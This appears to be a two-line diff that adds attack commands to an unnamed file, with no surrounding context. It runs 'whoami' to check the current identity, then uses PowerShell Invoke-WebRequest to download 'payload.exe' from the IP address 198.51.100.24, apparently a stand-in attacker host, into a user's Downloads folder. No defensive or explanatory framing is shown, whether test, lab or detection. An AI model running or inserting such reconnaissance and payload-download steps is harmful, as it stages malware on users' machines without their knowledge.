@@ -1,0 +1,2 @@
+whoami
+Invoke-WebRequest http://198.51.100.24/payload.exe -OutFile C:\Users\alex\Downloads\payload.exe
